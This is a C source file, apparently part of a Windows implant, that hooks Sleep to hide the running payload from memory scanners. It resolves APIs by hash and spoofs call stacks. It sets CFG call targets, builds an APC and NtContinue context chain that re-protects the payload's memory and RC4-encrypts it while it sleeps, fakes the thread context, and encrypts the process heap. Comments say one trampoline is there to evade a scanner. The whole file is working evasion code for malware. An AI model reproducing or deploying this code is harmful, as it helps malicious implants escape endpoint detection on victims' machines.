//
// https://github.com/SecIdiot/FOLIAGE
//


#include "hooks.h"

#define KEY_SIZE 16
#define KEY_VALS "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"


typedef struct {
    struct
    {
        D_API( LdrGetProcedureAddress );
        D_API( LdrLoadDll );
        D_API( LdrUnloadDll );
        D_API( NtAlertResumeThread );
        D_API( NtClose );
        D_API( NtContinue );
        D_API( NtCreateEvent );
        D_API( NtCreateThreadEx );
        D_API( NtGetContextThread );
        D_API( NtOpenThread );
        D_API( NtProtectVirtualMemory );
        D_API( NtQueryInformationProcess );
        D_API( NtQueueApcThread );
        D_API( NtSetContextThread );
        D_API( NtSignalAndWaitForSingleObject );
        D_API( NtTerminateThread );
        D_API( NtTestAlert );
        D_API( NtWaitForSingleObject );
        D_API( RtlAllocateHeap );
        D_API( RtlExitUserThread );
        D_API( RtlFreeHeap );
        D_API( RtlInitAnsiString );
        D_API( RtlInitUnicodeString );
        D_API( RtlRandomEx );
        D_API( RtlUserThreadStart );
        D_API( RtlWalkHeap );
        D_API( nRtlCopyMemory );
        D_API( nRtlZeroMemory );

    } ntdll;

    struct
    {
        D_API( SetProcessValidCallTargets );

    } kb;

    struct
    {
        D_API( WaitForSingleObjectEx );
        D_API( Sleep );

    } k32;
    
    struct
    {
        D_API( SystemFunction032 );

    } advapi;

    HANDLE   hNtdll;
    HANDLE   hK32;
    HANDLE   hAdvapi;
    ULONG    szNtdll;
    ULONG    szK32;

    PVOID    Buffer;
    DWORD64  Length;
    PVOID    ExecRegion;
    DWORD64  ExecRegionSize;
    PVOID    OriginalText;
    DWORD64  OriginalTextSize;
    NTSTATUS CFG;
    DWORD    dwMilliseconds;
    UCHAR    enckey[KEY_SIZE];
    DWORD64  BackupPageSize;

} API, *PAPI;


SECTION( D ) BOOL isCFGEnforced( PAPI pApi )
{
    EXTENDED_PROCESS_INFORMATION PrInfo = { 0 };

    if( pApi->ntdll.NtQueryInformationProcess && pApi->kb.SetProcessValidCallTargets )
    {
        PrInfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
        PrInfo.ExtendedProcessInfoBuffer = 0;

        if ( SPOOF( pApi->ntdll.NtQueryInformationProcess, NULL, NULL, ( HANDLE )-1, C_PTR( ( ProcessCookie | ProcessUserModeIOPL ) ), &PrInfo, C_PTR( sizeof( PrInfo ) ), NULL ) == STATUS_SUCCESS )
        {
            return TRUE;
        };
    };

    return FALSE;
};

SECTION( D ) NTSTATUS setValidCallTargets( PAPI pApi, HANDLE module, LPVOID funcPtr )
{
    NTSTATUS                Status = STATUS_SUCCESS;
    PIMAGE_DOS_HEADER       DosHdr = NULL;
    PIMAGE_NT_HEADERS       NtsHdr = NULL;
    SIZE_T                  Length = 0;           
    CFG_CALL_TARGET_INFO    CfInfo = { 0 };

    if( isCFGEnforced( pApi ) )
    {
        DosHdr = C_PTR( module );
        NtsHdr = C_PTR( U_PTR( DosHdr ) + DosHdr->e_lfanew );
        Length = NtsHdr->OptionalHeader.SizeOfImage;
        Length = ( Length + 0x1000 - 1 ) &~ ( 0x1000 - 1 );

        CfInfo.Flags  = CFG_CALL_TARGET_VALID;
        CfInfo.Offset = U_PTR( funcPtr ) - U_PTR( module );
        Status = pApi->kb.SetProcessValidCallTargets( ( ( HANDLE )-1 ), module, Length, 1, &CfInfo ) ? STATUS_SUCCESS : NtCurrentTeb()->LastErrorValue;
    };

    return Status;
};

SECTION( D ) VOID handleCFG( PAPI pApi )
{
    setValidCallTargets( pApi, pApi->hK32, C_PTR( pApi->k32.WaitForSingleObjectEx ) );
    setValidCallTargets( pApi, pApi->hK32, C_PTR( pApi->k32.Sleep ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtContinue ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtGetContextThread ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtProtectVirtualMemory ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtSetContextThread ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtTestAlert ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.NtWaitForSingleObject ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.RtlExitUserThread ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.nRtlCopyMemory ) );
    setValidCallTargets( pApi, pApi->hNtdll, C_PTR( pApi->ntdll.nRtlZeroMemory ) );
};

SECTION( D ) NTSTATUS queueAPCs( PAPI pApi, PCONTEXT* contexts, HANDLE hThread )
{
    NTSTATUS Status;
    for( int i = 17; i >= 0; i-- )
    {
        Status = SPOOF( pApi->ntdll.NtQueueApcThread, NULL, NULL, hThread, C_PTR( pApi->ntdll.NtContinue ), contexts[i], NULL, NULL );
        if( Status != STATUS_SUCCESS )
        {
            break;
        };
    };

    return Status;
};

SECTION( D ) VOID initContexts( PAPI pApi, PCONTEXT* contexts )
{
    PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

    for( int i = 20; i >= 0; i-- )
    {
        contexts[i] = ( PCONTEXT )C_PTR( SPOOF( pApi->ntdll.RtlAllocateHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, C_PTR( HEAP_ZERO_MEMORY ), C_PTR( sizeof( CONTEXT ) ) ) );
        if( i < 18 )
        {
            *contexts[i] = *contexts[19];
        };
        contexts[i]->ContextFlags = CONTEXT_FULL;
    };
}; 

SECTION( D ) VOID freeContexts( PAPI pApi, PCONTEXT* contexts )
{
    PVOID hProcessHeap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;

    for( int i = 0; i < 21; i++ )
    {
        if( contexts[i] )
        {
            SPOOF( pApi->ntdll.RtlFreeHeap, pApi->hNtdll, pApi->szNtdll, hProcessHeap, 0, contexts[i] );
        };
    };
}; 

SECTION( D ) VOID startSleepChain( PAPI pApi, HANDLE hThread, HANDLE hEvent )
{
    ULONG outSuspendCount  = 0;

    if( SPOOF( pApi->ntdll.NtAlertResumeThread, NULL, NULL, hThread, &outSuspendCount ) == STATUS_SUCCESS )
    {
        SPOOF( pApi->ntdll.NtSignalAndWaitForSingleObject, NULL, NULL, hEvent, hThread, C_PTR( TRUE ), NULL );
    };
};

SECTION( D ) VOID addCommonStackData( PAPI pApi, PCONTEXT* contexts )
{
    for( int i = 0; i < 18; i++ )
    {
        contexts[i]->Rsp = U_PTR( contexts[19]->Rsp - ( 0x1000 * ( i + 1 ) ) );
        *( ULONG_PTR * )( contexts[i]->Rsp + 0x00 ) = ( ULONG_PTR ) pApi->ntdll.NtTestAlert;
    };
};

SECTION( D ) NTSTATUS openOriginalThread( PAPI pApi, PHANDLE thread )
{
    NTSTATUS            Status  = STATUS_SUCCESS;
    CLIENT_ID           Cid     = { 0 };
    OBJECT_ATTRIBUTES   ObjAddr = { 0 };

    Cid.UniqueProcess = 0;
    Cid.UniqueThread = NtCurrentTeb()->ClientId.UniqueThread;
    ObjAddr.Length = sizeof( ObjAddr );
    
    Status = SPOOF( pApi->ntdll.NtOpenThread, NULL, NULL, thread, C_PTR( THREAD_ALL_ACCESS ), &ObjAddr, &Cid );

    return Status;
};

SECTION( D ) NTSTATUS createSleepThread( PAPI pApi, PHANDLE thread )
{
    NTSTATUS Status = STATUS_SUCCESS;
    PVOID    StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
    SIZE_T   StackSize = 0x01FFFFFF;

    Status = ( NTSTATUS ) SPOOF( pApi->ntdll.NtCreateThreadEx, pApi->hNtdll, pApi->szNtdll, thread, C_PTR( THREAD_ALL_ACCESS ), NULL, ( HANDLE )-1, StartAddress, NULL, C_PTR( TRUE ), C_PTR( 0 ), C_PTR( StackSize ), C_PTR( StackSize ), NULL );

    return Status;
};

// Obtain a true handle to our original thread and create a suspended wait thread
SECTION( D ) NTSTATUS setupThreads( PAPI pApi, PHANDLE originalThd, PHANDLE sleepThd )
{    
    NTSTATUS Status = STATUS_SUCCESS;

    Status = openOriginalThread( pApi, originalThd );
    if( Status != STATUS_SUCCESS )
    {
        return Status;
    };

    Status = createSleepThread( pApi, sleepThd );

    return Status;
};

SECTION( D ) VOID delayExec( PAPI pApi )
{
    #define CHECKERR( status )  if( status != STATUS_SUCCESS ) { goto cleanup; };

    NTSTATUS                Status   = 0;
    HANDLE                  SyncEvt  = NULL;
    HANDLE                  WaitThd  = NULL;
    HANDLE                  OrigThd  = NULL;
    ULONG                   OldProt  = 0;
    PCONTEXT                Contexts[21]; // APC CTXs 0-17, Original CTX, Sleep CTX, Fake CTX
    UCHAR                   EmptyStk[256];
    USTRING                 S32Key;
    USTRING                 S32Data;
    PVOID                   Trampoline;
    PIMAGE_NT_HEADERS       Nt       = NULL;
    PIMAGE_SECTION_HEADER   Sec      = NULL;
    PVOID                   Text     = NULL;
    DWORD                   TextSize = NULL;
    

    RtlSecureZeroMemory( &Contexts, sizeof( Contexts ) );
    RtlSecureZeroMemory( &EmptyStk, sizeof( EmptyStk ) );
    
    // CFG for APIs called in ROP
    handleCFG( pApi );

    S32Key.len  = S32Key.maxlen = KEY_SIZE;
    S32Key.str  = pApi->enckey;
    S32Data.len = S32Data.maxlen = pApi->BackupPageSize;
    S32Data.str = ( PBYTE )( pApi->OriginalText );

    // Prep the Foliage
    Status = setupThreads( pApi, &OrigThd, &WaitThd );
    CHECKERR( Status );
    
    Status = SPOOF( pApi->ntdll.NtCreateEvent, NULL, NULL, &SyncEvt, C_PTR( EVENT_ALL_ACCESS ), NULL, C_PTR( 1 ), C_PTR( FALSE ) );
    CHECKERR( Status );

    initContexts( pApi, Contexts );

    Status = SPOOF( pApi->ntdll.NtGetContextThread, NULL, NULL, WaitThd, Contexts[19] );
    CHECKERR( Status );

    addCommonStackData( pApi, Contexts );
    Trampoline = FindGadget( pApi->hNtdll, pApi->szNtdll );

    Contexts[20]->Rip = U_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
    Contexts[20]->Rsp = U_PTR( &EmptyStk );

    DWORD c = 17; 
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtWaitForSingleObject );
    Contexts[c]->Rcx = U_PTR( SyncEvt );
    Contexts[c]->Rdx = U_PTR( FALSE );
    Contexts[c]->R8  = U_PTR( NULL );
    
    c--;
    Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
    Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
    Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
    Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
    Contexts[c]->R8  = U_PTR( &pApi->OriginalTextSize );
    Contexts[c]->R9  = U_PTR( PAGE_READWRITE );
    *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;

    c--;
    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
    Contexts[c]->Rcx = U_PTR( &S32Data );
    Contexts[c]->Rdx = U_PTR( &S32Key );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlCopyMemory );
    Contexts[c]->Rcx = U_PTR( pApi->ExecRegion );
    Contexts[c]->Rdx = U_PTR( pApi->Buffer );
    Contexts[c]->R8  = U_PTR( pApi->Length );
    
    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlCopyMemory );
    Contexts[c]->Rcx = U_PTR( pApi->Buffer );
    Contexts[c]->Rdx = U_PTR( pApi->OriginalText );
    Contexts[c]->R8  = U_PTR( pApi->OriginalTextSize );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
    Contexts[c]->Rcx = U_PTR( &S32Data );
    Contexts[c]->Rdx = U_PTR( &S32Key );

    c--;
    Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
    Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
    Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
    Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
    Contexts[c]->R8  = U_PTR( &pApi->OriginalTextSize );
    Contexts[c]->R9  = U_PTR( PAGE_EXECUTE_READ );
    *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtGetContextThread );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( Contexts[18] ); // Original Context

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtSetContextThread );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( Contexts[20] ); // Fake Context

    c--;
    Contexts[c]->Rip = U_PTR( pApi->k32.Sleep );
    Contexts[c]->Rcx = U_PTR( pApi->dwMilliseconds );

    c--;
    Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
    Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
    Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
    Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
    Contexts[c]->R8  = U_PTR( &pApi->OriginalTextSize );
    Contexts[c]->R9  = U_PTR( PAGE_READWRITE );
    *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlZeroMemory );
    Contexts[c]->Rcx = U_PTR( pApi->Buffer );
    Contexts[c]->Rdx = U_PTR( pApi->OriginalTextSize );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
    Contexts[c]->Rcx = U_PTR( &S32Data );
    Contexts[c]->Rdx = U_PTR( &S32Key );
    
    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.nRtlCopyMemory );
    Contexts[c]->Rcx = U_PTR( pApi->Buffer );
    Contexts[c]->Rdx = U_PTR( pApi->ExecRegion );
    Contexts[c]->R8  = U_PTR( pApi->Length );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->advapi.SystemFunction032 );
    Contexts[c]->Rcx = U_PTR( &S32Data );
    Contexts[c]->Rdx = U_PTR( &S32Key );

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.NtSetContextThread );
    Contexts[c]->Rcx = U_PTR( OrigThd );
    Contexts[c]->Rdx = U_PTR( Contexts[18] ); // Original Context

    c--;
    Contexts[c]->Rip = U_PTR( Trampoline ); // JMP RBX Trampoline to Evade Patriot
    Contexts[c]->Rbx = U_PTR( &pApi->ntdll.NtProtectVirtualMemory );
    Contexts[c]->Rcx = U_PTR( ( HANDLE )-1 );
    Contexts[c]->Rdx = U_PTR( &pApi->Buffer );
    Contexts[c]->R8  = U_PTR( &pApi->ExecRegionSize );
    Contexts[c]->R9  = U_PTR( PAGE_EXECUTE_READ );
    *( ULONG_PTR * )( Contexts[c]->Rsp + 0x28 ) = ( ULONG_PTR )&OldProt;

    c--;
    Contexts[c]->Rip = U_PTR( pApi->ntdll.RtlExitUserThread );
    Contexts[c]->Rcx = U_PTR( NULL );
    
    Status = queueAPCs( pApi, Contexts, WaitThd );
    CHECKERR( Status );

    startSleepChain( pApi, WaitThd, SyncEvt );

cleanup:
    freeContexts( pApi, Contexts );
    
    if( WaitThd )
    {
        SPOOF( pApi->ntdll.NtTerminateThread, NULL, NULL, WaitThd, C_PTR( STATUS_SUCCESS ) );
        SPOOF( pApi->ntdll.NtClose, NULL, NULL, WaitThd );
    };
    
    if( OrigThd )
    {
        SPOOF( pApi->ntdll.NtClose, NULL, NULL, OrigThd );
    };
    
    if( SyncEvt )
    {
        SPOOF( pApi->ntdll.NtClose, NULL, NULL, SyncEvt );
    };

    RtlSecureZeroMemory( &S32Data, sizeof( S32Data ) );
    RtlSecureZeroMemory( &S32Key, sizeof( S32Key ) );
}; 

SECTION( D ) VOID encryptHeap( PAPI pApi )
{
    USTRING S32Key;
    USTRING S32Data;
    RTL_HEAP_WALK_ENTRY Entry;

    RtlSecureZeroMemory( &Entry, sizeof( Entry ) );
    S32Key.len = S32Key.maxlen = KEY_SIZE;
    S32Key.str = pApi->enckey;

    while ( NT_SUCCESS( SPOOF( pApi->ntdll.RtlWalkHeap, NULL, NULL, GetProcessHeap_Hook(), &Entry  ) ) )
    {
        if( ( Entry.Flags & RTL_PROCESS_HEAP_ENTRY_BUSY ) != 0 )
        {
            S32Data.len = S32Data.maxlen = Entry.DataSize;
            S32Data.str = ( PBYTE )( Entry.DataAddress );
            pApi->advapi.SystemFunction032( &S32Data, &S32Key );
        };
    };

    RtlSecureZeroMemory( &S32Data, sizeof( S32Data ) );
    RtlSecureZeroMemory( &S32Key, sizeof( S32Key ) );
    RtlSecureZeroMemory( &Entry, sizeof( Entry ) );
};

SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
{
    PPEB                Peb;
    UNICODE_STRING      Uni;
    ANSI_STRING			Str;
    HANDLE              hKb;

    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    RtlSecureZeroMemory( &Str, sizeof( Str ) );

    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;

    pApi->hNtdll  = FindModule( H_LIB_NTDLL, Peb, &pApi->szNtdll );
    pApi->hAdvapi = FindModule( H_LIB_ADVAPI32, Peb, NULL );
    pApi->hK32    = FindModule( H_LIB_KERNEL32, Peb, &pApi->szK32 );
    hKb           = FindModule( H_LIB_KERNELBASE, Peb, NULL );

    if( !pApi->hNtdll || !pApi->hK32 || !hKb )
    {
        return -1;
    };

    pApi->ntdll.LdrGetProcedureAddress          = FindFunction( pApi->hNtdll, H_API_LDRGETPROCEDUREADDRESS );
    pApi->ntdll.LdrLoadDll                      = FindFunction( pApi->hNtdll, H_API_LDRLOADDLL );
    pApi->ntdll.LdrUnloadDll                    = FindFunction( pApi->hNtdll, H_API_LDRUNLOADDLL );
    pApi->ntdll.NtAlertResumeThread             = FindFunction( pApi->hNtdll, H_API_NTALERTRESUMETHREAD );
    pApi->ntdll.NtClose                         = FindFunction( pApi->hNtdll, H_API_NTCLOSE );
    pApi->ntdll.NtContinue                      = FindFunction( pApi->hNtdll, H_API_NTCONTINUE );
    pApi->ntdll.NtCreateEvent                   = FindFunction( pApi->hNtdll, H_API_NTCREATEEVENT );
    pApi->ntdll.NtCreateThreadEx                = FindFunction( pApi->hNtdll, H_API_NTCREATETHREADEX );
    pApi->ntdll.NtGetContextThread              = FindFunction( pApi->hNtdll, H_API_NTGETCONTEXTTHREAD );
    pApi->ntdll.NtOpenThread                    = FindFunction( pApi->hNtdll, H_API_NTOPENTHREAD );
    pApi->ntdll.NtProtectVirtualMemory          = FindFunction( pApi->hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
    pApi->ntdll.NtQueryInformationProcess       = FindFunction( pApi->hNtdll, H_API_NTQUERYINFORMATIONPROCESS );
    pApi->ntdll.NtQueueApcThread                = FindFunction( pApi->hNtdll, H_API_NTQUEUEAPCTHREAD );
    pApi->ntdll.NtSetContextThread              = FindFunction( pApi->hNtdll, H_API_NTSETCONTEXTTHREAD );
    pApi->ntdll.NtSignalAndWaitForSingleObject  = FindFunction( pApi->hNtdll, H_API_NTSIGNALANDWAITFORSINGLEOBJECT );
    pApi->ntdll.NtTerminateThread               = FindFunction( pApi->hNtdll, H_API_NTTERMINATETHREAD );
    pApi->ntdll.NtTestAlert                     = FindFunction( pApi->hNtdll, H_API_NTTESTALERT );
    pApi->ntdll.NtWaitForSingleObject           = FindFunction( pApi->hNtdll, H_API_NTWAITFORSINGLEOBJECT );
    pApi->ntdll.RtlAllocateHeap                 = FindFunction( pApi->hNtdll, H_API_RTLALLOCATEHEAP );
    pApi->ntdll.RtlExitUserThread               = FindFunction( pApi->hNtdll, H_API_RTLEXITUSERTHREAD );
    pApi->ntdll.RtlFreeHeap                     = FindFunction( pApi->hNtdll, H_API_RTLFREEHEAP );
    pApi->ntdll.RtlInitAnsiString               = FindFunction( pApi->hNtdll, H_API_RTLINITANSISTRING );
    pApi->ntdll.RtlInitUnicodeString            = FindFunction( pApi->hNtdll, H_API_RTLINITUNICODESTRING );
    pApi->ntdll.RtlRandomEx                     = FindFunction( pApi->hNtdll, H_API_RTLRANDOMEX );
    pApi->ntdll.RtlUserThreadStart              = FindFunction( pApi->hNtdll, H_API_RTLUSERTHREADSTART );
    pApi->ntdll.RtlWalkHeap                     = FindFunction( pApi->hNtdll, H_API_RTLWALKHEAP );
    pApi->ntdll.nRtlCopyMemory                  = FindFunction( pApi->hNtdll, H_API_RTLCOPYMEMORY );
    pApi->ntdll.nRtlZeroMemory                  = FindFunction( pApi->hNtdll, H_API_RTLZEROMEMORY );

    pApi->kb.SetProcessValidCallTargets         = FindFunction( hKb, H_API_SETPROCESSVALIDCALLTARGETS );
    pApi->k32.WaitForSingleObjectEx             = FindFunction( pApi->hK32, H_API_WAITFORSINGLEOBJECTEX );
    pApi->k32.Sleep                             = FindFunction( pApi->hK32, H_API_SLEEP );

    if( !pApi->hAdvapi )
    {
        pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"advapi32.dll" ) ) );
        SPOOF( pApi->ntdll.LdrLoadDll, NULL, NULL, NULL, C_PTR( 0 ), &Uni, &pApi->hAdvapi );

        if( !pApi->hAdvapi )
        {
            return -1;
        };
    };
    
    pApi->ntdll.RtlInitAnsiString( &Str, C_PTR( OFFSET( "SystemFunction032" ) ) );
    SPOOF( pApi->ntdll.LdrGetProcedureAddress, NULL, NULL, pApi->hAdvapi, &Str, C_PTR( 0 ), ( PVOID* )&pApi->advapi.SystemFunction032 );
    
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    RtlSecureZeroMemory( &Str, sizeof( Str ) );

    return STATUS_SUCCESS;
};

SECTION( D ) VOID Sleep_Hook( DWORD dwMilliseconds ) 
{
    API                 Api;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );

    Api.CFG              = 0;
    Api.dwMilliseconds   = dwMilliseconds;
    Api.Buffer           = C_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Region );
    Api.Length           = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->Size );
    Api.ExecRegion       = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegion );
    Api.ExecRegionSize   = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->ExecRegionSize );
    Api.OriginalText     = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->OriginalText );
    Api.OriginalTextSize = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->OriginalTextSize );
    Api.BackupPageSize   = U_PTR( ( ( PSTUB ) OFFSET( Stub ) )->BackupPageSize );

    for ( int i = 0; i < KEY_SIZE ; i++ )
    {
        Api.enckey[i]    = ( ( PSTUB ) OFFSET( Stub ) )->Key[i];
    }

    if( resolveSleepHookFunctions( &Api ) == STATUS_SUCCESS )
    {
        
        if( dwMilliseconds < 1000 )
        {
            // Don't waste cycles on the full chain for `sleep 0`
            SPOOF( Api.k32.WaitForSingleObjectEx, Api.hK32, Api.szK32,( HANDLE )-1, dwMilliseconds );
            return;
        };

        encryptHeap( &Api );
        __debugbreak();
        delayExec( &Api );
        encryptHeap( &Api );
    };

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
};
